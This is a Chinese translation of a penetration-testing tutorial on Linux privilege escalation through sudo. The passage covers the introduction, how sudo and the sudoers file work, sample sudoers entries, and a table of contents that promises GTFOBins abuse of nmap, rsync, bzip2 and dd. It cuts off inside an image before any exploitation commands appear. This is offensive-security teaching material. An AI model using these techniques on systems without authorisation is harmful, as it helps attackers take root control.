<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-Sudo_1" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-Sudo_1 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-Sudo_1 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Sudo Part-1 – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Sudo Part-1 – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.3e5c23bd.js" defer="defer"></script>
<script src="/web/assets/js/main.eab2f939.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/category/️渗透">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/gpt-问答">🤖GPT 问答</a><button aria-label="展开侧边栏分类 &#x27;🤖GPT 问答&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-Sudo_1</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-Sudo_1</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/sudo-part-1-lpe/" target="_blank" rel="noopener noreferrer">Sudo Part-1 – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li>
<p><a href="#id0">0 前言</a></p>
</li>
<li>
<p><a href="#id1">1 什么是 Sudo 以及它是如何工作？</a></p>
<ul>
<li><a href="#id1.1">1.1Sudo 二进制、权限和组解释</a></li>
</ul>
</li>
<li>
<p><a href="#id2">2 手动寻找 Sudo 权限</a></p>
<ul>
<li><a href="#id2.1">2.1 枚举当前用户的 Sudo 权限</a></li>
<li><a href="#id2.2">2.2 枚举 Sudo 组中的用户</a></li>
</ul>
</li>
<li>
<p><a href="#id3">3 自动寻找 Sudo 权限 – LinPEAS</a></p>
<ul>
<li><a href="#id3.1">3.1 在内存中执行LinPEAS</a></li>
<li><a href="#id3.2">3.2 枚举 Sudo 权限</a></li>
</ul>
</li>
<li>
<p><a href="#id4">4 利用 Sudo 命令 – GTFOBins</a></p>
<ul>
<li><a href="#id4.1">4.1 利用简单 Shell 二进制文件 – nmap 和 rsync</a>
<ul>
<li><a href="#id511">4.1.1 nmap</a></li>
<li><a href="#id512">4.1.2 rsync</a></li>
</ul>
</li>
<li><a href="#id4.2">4.2 利用读/写二进制文件 – bzip2 和 dd</a>
<ul>
<li><a href="#id4.2.1">4.2.1 Bzip2 – 文件读取漏洞</a></li>
<li><a href="#id4.2.2">4.2.2 dd – 文件写入漏洞</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><a href="#id5">5 最后的想法</a></p>
</li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><div id="id0">0、前言</div><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>对于这篇关于Linux权限提升技术的2部分文章，我们将深入探讨利用二进制sudo特权的各种方法。</p>
<blockquote>
<p>这篇文章比我最初预期的要长，所以我不得不把它分成两部分。</p>
</blockquote>
<p>在第 1 部分中，我们首先采取手动枚举当前用户以及sudo组的sudo权限。然后，我们再了解如何使用工具（LinPEAS）为我们枚举这些信息。</p>
<p>在枚举阶段，我们将发现当前用户可以使用sudo权限运行的总共有7个命令（二进制文件） 。</p>
<p>从这7个命令中，我们会发现其中4个使用标准二进制文件，我们可以通过利用 GTFObins 这个站点轻松利用这些二进制文件。</p>
<p>在第 2 部分中，我们将把重点转向更高级的利用主题，例如：滥用预期功能（即在 GTFOBins 上未发现的二进制文件的额外功能）、LD_PRELOAD、令牌重用以及针对sudo程序特定版本的两个 CVE 漏洞。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1什么是-sudo-以及它是如何工作"><div id="id1">1、什么是 Sudo 以及它是如何工作？</div><a href="#1什么是-sudo-以及它是如何工作" class="hash-link" aria-label="1什么是-sudo-以及它是如何工作的直接链接" title="1什么是-sudo-以及它是如何工作的直接链接">​</a></h2>
<p>Sudo 代表“super user do”，是一个二进制程序，它允许用户以另一个用户（一般是root）的身份运行程序。</p>
<p>然而，<strong>sudo</strong>不仅仅是一个二进制文件，它既是一个特权还是一个组。</p>
<p><strong>sudo</strong>的主要目的是允许用户以 root 身份运行程序，否则他们无法以标准用户身份运行该程序。这创建了一个更“安全”的环境，因为用户不需要以 root 身份登录或 <strong>su root</strong> 去以 root 身份运行程序 - 它们可以简单地使用sudo来代替。</p>
<blockquote>
<p>Sudo 还可以用于以非 root 用户身份运行程序，但这并不常见。</p>
</blockquote>
<p>通常，这将被锁定为以 root 身份去运行单个命令，但它还可以通过命令包含特定参数的方式以更细粒度的去控制命令的部分功能以root身份去执行。例如，它可用于允许用户以 root 身份运行 <strong>systemctl</strong>，或者它可以更具体并允许用户仅重新启动指定的服务，如 <strong>systemctl ssh restart</strong>。</p>
<p>这极大地改变了用户对任何指定程序的 root 权限的访问权限。例如，仅使用<strong>systemctl</strong>，用户就可以以 root 身份运行任何参数并操作任何服务；然而，使用特定的命令行参数，用户只能执行一项任务。</p>
<p>或者，<strong>sudo</strong>权限可以设置为“ALL”，这意味着任何程序都可以作为 root 运行。本质上，这会导致对整个文件系统的完全根访问。</p>
<blockquote>
<p>默认情况下，当用户拥有 sudo 权限时，需要输入密码（不是 root 密码）才能使用<strong>sudo</strong>命令。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="11sudo-二进制权限和组解释"><strong><div id="id1.1">1.1、Sudo 二进制、权限和组解释</div></strong><a href="#11sudo-二进制权限和组解释" class="hash-link" aria-label="11sudo-二进制权限和组解释的直接链接" title="11sudo-二进制权限和组解释的直接链接">​</a></h4>
<p>如上所述，<strong>sudo</strong>是二进制、特权和组。但这到底意味着什么？</p>
<p>首先，<strong>sudo</strong>是一个程序（二进制），这意味着它有多个版本和更新。这同时也意味着<strong>sudo</strong>的某些版本可能具有公共漏洞和分配给它们的 CVE。</p>
<p>其次，<strong>sudo</strong>是一种特权，因为它为用户提供了以 root 身份运行程序的能力。这些权限在 <strong>/etc/sudoers</strong> 文件中被显式配置。</p>
<p>Sudo 权限可以通过几种不同的方式应用。如上所述，它们可以设置为运行“所有”程序、运行指定程序或使用指定参数运行指定程序。</p>
<p>sudoers文件可以通过多种方式进行配置，但大多数情况下它非常容易理解。我们经常会看到诸如“ALL”和“NOPASSWD”之类的内容，有时还会看到诸如 root 之类的用户名或其他名称，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">注：sudoers文件格式：sudo使用者帐号  登入者的来源主机名称=(可切换的身份)  可下达的指令</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   (ALL : ALL) ALL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   (ALL : ALL) /some/program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   (root) NOPASSWD: ALL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   (user) /some/program</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>此列表只是一个简单的示例，并不详尽。</p>
<p>这里重点是…</p>
<ul>
<li>ALL<!-- -->:ALL<!-- --> 是程序可以运行的用户/组。这些可以设置为特定的用户/组 – 除非另有指定，否则全部默认为 root。</li>
<li>NOPASSWD 意味着我们可以在不输入当前用户密码的情况下运行sudo 。</li>
<li>最后的 ALL 表示所有程序，但这也可以是特定程序。</li>
</ul>
<blockquote>
<p>要获得完整的理解，请查看<strong>sudo</strong>联机帮助页。</p>
</blockquote>
<p>最后，<strong>sudo</strong>也是一个组。默认情况下，<strong>sudo</strong>组配置为在<strong>sudoers</strong>文件中运行 (ALL<!-- -->:ALL<!-- -->) ALL。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAbUAAABACAIAAAAS4H6UAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAABHgSURBVHhe7Z35Q1PH2sf7+3tvvVI2EwgJWwKRRTYLoWoUBEEEVxCwIOBrKkrdt5YqVFwoVVukRBSLClYWa1EQF6CgKCCQENYs+Lfce05miMnhTEJsUGOex88P8sxhZs5znvmemXOS4bOOjo7PwMDAwMBMraGhAf8PDAwMDIzd3uhUAAAAAAIrIzJGGQAAgCODlREZowwAAMCRwcqIjFEGAADgyGBlRMYoAwAAcGSwMiJjlAEAADgyWBmRMcoAAAAcGayMyBhlAAAAjgxWRmSMMgAAAEcGKyMyRhkAAIAjg5URGaMMAADAkcHKiIxRBgAA4MhgZUTGKAMAAHBksDIiY5QBAAA4MlgZkTHKAAAAHBmsjMgYZQAAAI4MVkZkjDIAAABHBisjMkYZAACAI4OVERmjDAAAwJHByoiMUWZDtI9PJIiFIpGni1Ns2QulRf/Hh6K9LL3wt04d0/9hGVW1Fqcv9+PzODzRyu9aR+Yc8Eky+rpGllFyV8P0A8B8sCJ/sDIiY5TNMqq8tC4wv06jUz47HhV9rFXLPGAOU/V7Av69yC/n7qSpX1m+3pVNB0n+j4jh2nRO9MmHls/9faJu/DbYN0PeTfVKPdQ5zIj2J4vyeUmMW9qlSaZ/vmg7zsoOV/VrmH57wd77/6GxIn+QMGJjlM2iaNsfGl9GTZ2Gb2T6bJEPzjmAibq5ICg0fl2gX/6dYZMi0EebMjNcts5NWj4wyvBbQDOi6m9trCxv6v+YA26Gf6qP0zUbOVEHO9VMv71g7/3/0NhQHzXPLm4RC1wWc/0Clor9PJ2/4InCChvMr+NG7n0TEFxUf3e3UJj3+7RxkVX6OP6gsmBFkC9fIPCLzvjhgZJSgUH5Zo7k+3ZKpKYV3f1DgzrdqKIinpNSrjT+RSOmazYJk3MLpCJfYezekr1JId6+4Tk3XusFRd3dcDQ53IfL9fD+MuPUQ7p+M8fT+hiRe2h3XLCQt0QQlX65c1b62eqhbip/HY0VebqsON3S9F1yhIjn5rymYogu0vVfP7ohTOgt8PHxCVq5taT5+QyqhwRLHHDRzOCZta6rfxp86zGD9uXVgykRYeHLgvjOLqIV6XmFvz1VmOknoV3j+4RxnlF+j6QjZbvXUPFxFyzP/LXLwmKfEAdS/aqZkYbTaaECHs8/NH5HitjFkN/k+LAw3XBIIhTxXRZ9wfETCUXi+NJns1lnVT0UrNdd++pOfqBXUlkfNbnT9l7L8A3MkSu05ONphv+Wy5KXeXE5XJ/gVXkVLWP08YQ4mOk/sX5WRkfqZGtC/f28Pbh8ceL+qwN4Nkq1y4